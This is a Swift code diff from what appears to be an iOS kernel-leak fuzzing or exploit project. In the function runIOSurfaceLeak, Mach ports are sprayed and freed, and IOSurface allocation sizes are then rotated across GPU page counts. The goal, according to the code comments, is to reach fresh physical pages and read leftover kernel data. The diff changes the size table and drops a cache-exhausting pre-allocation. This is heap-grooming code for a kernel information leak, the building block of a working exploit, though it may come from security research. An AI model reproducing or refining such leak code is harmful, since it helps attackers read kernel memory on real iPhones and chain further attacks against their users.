@@ -1765,25 +1765,20 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         for p in sprayPorts { mach_port_destroy(mach_task_self_, p) }
         step("port spray: \(sprayPorts.count) ports dirtied + freed")
 
-        // Rotate IOSurface dimensions each run — different size = different allocator bin
-        // = different physical pages = different kernel residue in the tail.
-        // Always allocate an extra IOSurface first to exhaust any cached allocation,
-        // then discard it so the next alloc must grab fresh physical pages.
+        // Rotate IOSurface dimensions each run — each variant produces a genuinely different
+        // allocationSize spanning different IOMalloc size classes → different physical pages.
+        // GPU page = 16KB; need bytesPerRow * height > 16384 for > 1 page.
         let variants: [(w: Int, h: Int, rowBytes: Int)] = [
-            (256, 4,   1024),   // 16KB  — 1 page pixel data
-            (256, 8,   1024),   // 32KB  — 2 page pixel data
-            (512, 4,   2048),   // 32KB  — 2 page pixel data
-            (256, 16,  1024),   // 65KB  — 4 pages
-            (384, 4,   1536),   // 24KB  — 1.5 pages (odd size, different bin)
-            (256, 6,   1024),   // 24KB  — 1.5 pages
-            (640, 4,   2560),   // 40KB
-            (256, 12,  1024),   // 49KB
+            (256,  32, 1024),   // 32KB  — 2 GPU pages
+            (512,  16, 2048),   // 32KB  — 2 GPU pages, wider stride
+            (256,  64, 1024),   // 64KB  — 4 GPU pages
+            (512,  32, 2048),   // 64KB  — 4 GPU pages, wider stride
+            (256, 128, 1024),   // 128KB — 8 GPU pages
+            (512,  64, 2048),   // 128KB — 8 GPU pages, wider stride
+            (512, 128, 2048),   // 256KB — 16 GPU pages
+            (1024, 64, 4096),   // 256KB — 16 GPU pages, wider stride
         ]
         let v = variants[_iosurfRunCount % variants.count]
-        // Exhaust the cached slot: alloc+discard before the real alloc
-        _ = IOSurface(properties: [.width: v.w, .height: v.h,
-                                    .bytesPerElement: 4, .bytesPerRow: v.rowBytes,
-                                    .pixelFormat: 0x42475241] as [IOSurfacePropertyKey: Any])
 
         let props: [IOSurfacePropertyKey: Any] = [
             .width: v.w, .height: v.h,
